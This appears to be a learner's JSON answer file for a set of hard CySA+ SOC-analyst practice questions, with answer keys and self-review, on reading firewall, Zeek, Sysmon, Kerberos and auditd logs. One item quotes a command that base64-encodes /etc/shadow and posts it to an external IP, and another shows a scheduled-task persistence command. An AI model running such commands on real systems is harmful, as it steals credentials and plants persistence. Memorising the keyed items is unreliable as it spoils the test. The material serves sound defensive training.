@@ -1,0 +1,234 @@
+{
+  "id": "007",
+  "title": "Very Hard Technical CySA+ Practice Set",
+  "date": "2026-06-09",
+  "status": "Raw Answers",
+  "summary": "15 very hard technical and misleading CySA+ / SOC analyst questions focused on firewall direction, TCP flags, Zeek conn.log, Windows logon types, Sysmon, Suricata fields, Active Directory DNS, Kerberos, Linux auditd, web logs, NetFlow, TLS phishing infrastructure, Windows services, SIEM correlation, and Linux external transfers.",
+  "questions": [
+    {
+      "id": 1,
+      "topic": "iptables / Firewall Direction",
+      "question": "Evaluate the following firewall log:\n\nkernel: iptables FORWARD DROP IN=eth1 OUT=eth0 SRC=10.20.4.55 DST=198.51.100.44 PROTO=TCP SPT=50122 DPT=443 SYN\n\nWhich interpretation is MOST accurate?",
+      "options": [
+        "The local host blocked traffic destined to itself on TCP/443",
+        "The firewall dropped a DNS query leaving the internal network",
+        "The firewall blocked routed outbound HTTPS connection initiation",
+        "The destination server rejected an established inbound connection"
+      ],
+      "correctAnswer": "C",
+      "myAnswer": "C, because its outbound https traffic and its blocked \"DROP\"",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 2,
+      "topic": "TCP Flags / Connection Direction",
+      "question": "A packet capture shows the following TCP flags:\n\nSRC=203.0.113.10 SPT=443 DST=10.1.5.25 DPT=51244 FLAGS=SYN,ACK\n\nWhich statement is MOST accurate?",
+      "options": [
+        "The external HTTPS server is responding to a client connection attempt",
+        "The internal workstation is initiating an outbound HTTPS connection",
+        "The internal workstation is rejecting an inbound TLS negotiation attempt",
+        "The external HTTPS server is initiating a new connection to the client"
+      ],
+      "correctAnswer": "A",
+      "myAnswer": "D, because its three way handshake from https to dynamic port",
+      "status": "Raw Answer",
+      "review": "incorrect"
+    },
+    {
+      "id": 3,
+      "topic": "Zeek conn.log",
+      "question": "A Zeek conn.log entry contains:\n\nid.orig_h=10.3.9.20 id.resp_h=203.0.113.70 id.resp_p=22 proto=tcp service=ssh history=ShR duration=0.02 orig_bytes=0 resp_bytes=0\n\nWhich interpretation is BEST?",
+      "options": [
+        "The SSH connection completed and transferred data successfully",
+        "The originator sent data before the responder acknowledged it",
+        "The responder accepted the connection and then sent payload data",
+        "The connection was attempted, but the responder reset it quickly"
+      ],
+      "correctAnswer": "D",
+      "myAnswer": "D, because in conn.log \"ShR\" means connection was quickly closed by the responder",
+      "status": "Raw Answer",
+      "review": "partial"
+    },
+    {
+      "id": 4,
+      "topic": "Windows Logon Types / SMB",
+      "question": "A Windows Security event shows:\n\nEvent ID: 4624\nLogon Type: 3\nAuthentication Package: NTLM\nAccount Name: backup_svc\nSource Network Address: 10.0.8.44\n\nShortly afterward, the same account accesses \\\\FS01\\C$.\n\nWhat should the analyst suspect FIRST?",
+      "options": [
+        "Interactive keyboard login at the file server console",
+        "Network logon using a service account to access admin shares",
+        "Remote desktop session with full graphical user interaction",
+        "Kerberos ticket renewal without resource access activity"
+      ],
+      "correctAnswer": "B",
+      "myAnswer": "B",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 5,
+      "topic": "Sysmon / Scheduled Task Persistence",
+      "question": "A Sysmon Event ID 11 shows:\n\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\Public\\update.ps1\n\nA later Event ID 1 shows:\n\nImage: C:\\Windows\\System32\\schtasks.exe\nCommandLine: schtasks /Create /SC MINUTE /MO 5 /TN UpdateCheck /TR \"powershell -File C:\\Users\\Public\\update.ps1\"\n\nWhat is the BEST interpretation?",
+      "options": [
+        "PowerShell wrote a temporary browser cache file and then removed it",
+        "The user manually scheduled a normal Windows cumulative update task",
+        "A script was staged and configured for recurring execution as persistence",
+        "The system automatically rotated a service account credential every minute"
+      ],
+      "correctAnswer": "C",
+      "myAnswer": "D, because \"/SC MINUTE\" probably means execution every minute",
+      "status": "Raw Answer",
+      "review": "incorrect"
+    },
+    {
+      "id": 6,
+      "topic": "Suricata / HTTP Fields",
+      "question": "A Suricata alert contains:\n\nalert http any any -> any any (msg:\"Possible path traversal\"; content:\"../\"; http_uri; nocase; sid:300111;)\n\nWhich field should the analyst inspect FIRST to confirm the rule matched the attempted path?",
+      "options": [
+        "http_uri",
+        "tls.sni",
+        "dns.rrname",
+        "flow_id"
+      ],
+      "correctAnswer": "A",
+      "myAnswer": "A",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 7,
+      "topic": "Active Directory DNS",
+      "question": "A DNS log shows repeated queries:\n\n_ldap._tcp.dc._msdcs.corp.local SRV\n_kerberos._tcp.corp.local SRV\n\nFrom a newly joined Windows workstation during first boot.\n\nWhich conclusion is MOST appropriate?",
+      "options": [
+        "The workstation is performing DNS tunneling through SRV records",
+        "The workstation is attempting Kerberoasting against SQL services",
+        "The workstation is exfiltrating encoded data to a rare domain",
+        "The workstation is discovering domain services and domain controllers"
+      ],
+      "correctAnswer": "D",
+      "myAnswer": "D, because other options don't make sense",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 8,
+      "topic": "Kerberos / Kerberoasting",
+      "question": "A Windows Security log shows many events:\n\nEvent ID: 4769\nService Name: MSSQLSvc/db01.corp.local:1433\nTicket Encryption Type: 0x17\nAccount Name: normal.user\n\nWhy might this be relevant during threat hunting?",
+      "options": [
+        "Event 4769 with RC4 always proves successful domain compromise",
+        "RC4 service tickets for SPNs can be useful Kerberoasting evidence",
+        "MSSQL service names prove DNS tunneling over TCP port 1433",
+        "Kerberos service ticket events only appear during password resets"
+      ],
+      "correctAnswer": "B",
+      "myAnswer": "B",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 9,
+      "topic": "Linux auditd / Exfiltration",
+      "question": "A Linux auditd event shows:\n\ntype=EXECVE msg=audit(1718801111.456:802): argc=3 a0=\"bash\" a1=\"-c\" a2=\"cat /etc/shadow | base64 | curl -X POST --data-binary @- https://198.51.100.20/upload\"\n\nWhich activity is MOST directly indicated?",
+      "options": [
+        "Credential file access followed by encoded upload over HTTPS",
+        "Normal package verification using a signed repository mirror",
+        "Local user enumeration without any network transfer activity",
+        "DNS tunneling using TXT record responses and cached resolvers"
+      ],
+      "correctAnswer": "A",
+      "myAnswer": "A",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 10,
+      "topic": "Web Authentication Logs",
+      "question": "An nginx access log shows:\n\n10.1.9.77 - - \"GET /admin HTTP/1.1\" 302\n10.1.9.77 - - \"GET /login HTTP/1.1\" 200\n10.1.9.77 - - \"POST /login HTTP/1.1\" 401\n10.1.9.77 - - \"POST /login HTTP/1.1\" 401\n10.1.9.77 - - \"POST /login HTTP/1.1\" 200\n\nWhich interpretation is BEST?",
+      "options": [
+        "The user received a forbidden response before any authentication attempt",
+        "The web server failed DNS resolution and then accepted anonymous access",
+        "The client was redirected to login and later authenticated after failures",
+        "The HTTP 302 confirms exploitation of a remote code execution flaw"
+      ],
+      "correctAnswer": "C",
+      "myAnswer": "C, because 302 means \"Found\" and 401 means \"Unauthorized\", 200 is \"Ok\"",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 11,
+      "topic": "NetFlow Analysis",
+      "question": "A NetFlow record shows:\n\nsrc=10.8.4.20 dst=203.0.113.90 dst_port=443 bytes_out=2400 bytes_in=780000000 duration=3600\n\nWhat should the analyst conclude FIRST?",
+      "options": [
+        "The host likely uploaded a large amount of internal data externally",
+        "The host likely downloaded a large amount of data from the remote system",
+        "The flow proves DNS tunneling because the destination used HTTPS",
+        "The flow proves lateral movement because the destination is public"
+      ],
+      "correctAnswer": "B",
+      "myAnswer": "B, because host received big amount of bytes",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 12,
+      "topic": "TLS / Phishing Infrastructure",
+      "question": "A TLS log shows:\n\nsni=login-microsoftonline-security.com\nsubject=CN=login-microsoftonline-security.com\nissuer=Let's Encrypt\nnot_before=2026-06-08\nja3=72a589da586844d7f0818ce684948eea\n\nA user clicked a Microsoft 365 security alert email five minutes earlier.\n\nWhich conclusion is MOST defensible?",
+      "options": [
+        "The domain is legitimate because it contains microsoftonline",
+        "The certificate issuer proves the destination is Microsoft owned",
+        "JA3 alone proves the destination is a phishing website",
+        "The lookalike SNI and recent certificate support phishing investigation"
+      ],
+      "correctAnswer": "D",
+      "myAnswer": "D, because other options kinda don't make sense",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 13,
+      "topic": "Windows Service Creation",
+      "question": "A Windows event shows:\n\nEvent ID: 7045\nService Name: AdobeUpdateSvc\nService File Name: C:\\Users\\Public\\adobe_update.exe\nStart Type: auto start\nAccount Name: LocalSystem\n\nWhich response is MOST appropriate FIRST?",
+      "options": [
+        "Investigate as possible service-based persistence before deleting evidence",
+        "Ignore because all Adobe update services run from the Public directory",
+        "Reboot immediately to remove volatile memory before collecting evidence",
+        "Close the alert because LocalSystem services cannot be malicious"
+      ],
+      "correctAnswer": "A",
+      "myAnswer": "A",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 14,
+      "topic": "SIEM Correlation Logic",
+      "question": "A SIEM correlation rule fires when:\n\nParentImage endswith WINWORD.EXE\nImage endswith powershell.exe\nCommandLine contains -EncodedCommand\nDestinationPort equals 443 within 60 seconds\n\nWhat does this rule BEST detect?",
+      "options": [
+        "Kerberos pre-authentication failure from a domain controller",
+        "Normal Office document printing followed by TLS certificate renewal",
+        "Malicious document execution leading to encoded PowerShell C2 behavior",
+        "DNS service discovery from a workstation joining Active Directory"
+      ],
+      "correctAnswer": "C",
+      "myAnswer": "C, because of encoded powershell command execution from Word",
+      "status": "Raw Answer",
+      "review": "correct"
+    },
+    {
+      "id": 15,
+      "topic": "Linux auth.log / External Transfer",
+      "question": "A Linux auth.log shows:\n\nsshd[1441]: Accepted publickey for deploy from 10.0.5.44 port 51902 ssh2\nsudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/rsync -av /srv/data/ backup@203.0.113.55:/tmp/sync/\n\nWhich statement is MOST accurate?",
+      "options": [
+        "The log proves password spraying because the login used publickey",
+        "The log proves DNS tunneling because rsync uses encoded subdomains",
+        "The log shows a local-only backup with no external network connection",
+        "The log shows privileged rsync transfer to an external host requiring validation"
+      ],
+      "correctAnswer": "D",
+      "myAnswer": "C",
+      "status": "Raw Answer",
+      "review": "incorrect"
+    }
+  ]
+}
